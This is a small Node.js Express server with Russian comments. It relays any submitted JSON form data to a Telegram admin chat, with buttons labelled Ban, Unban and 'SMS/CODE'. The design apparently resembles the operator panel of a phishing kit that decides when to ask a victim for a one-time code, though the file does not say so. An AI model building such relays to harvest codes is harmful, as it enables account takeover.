const express = require("express");
const app = express();

app.use(express.json());

let botInstance = null;

// подключаем бот
function setBot(bot) {
  botInstance = bot;
}

// создать заявку
app.post("/create", (req, res) => {
  const id = Date.now().toString();

  const data = req.body;

  if (botInstance) {
    botInstance.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `🆕 Заявка\nID: ${id}\n\n${JSON.stringify(data)}`,
      {
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🚫 Бан", callback_data: `ban_${id}` },
              { text: "✅ Разбан", callback_data: `unban_${id}` }
            ],
            [
              { text: "➡️ SMS/CODE", callback_data: `allow_${id}` }
            ]
          ]
        }
      }
    );
  }

  res.json({ ok: true, id });
});

app.get("/", (req, res) => {
  res.send("ok");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});

module.exports = { setBot };
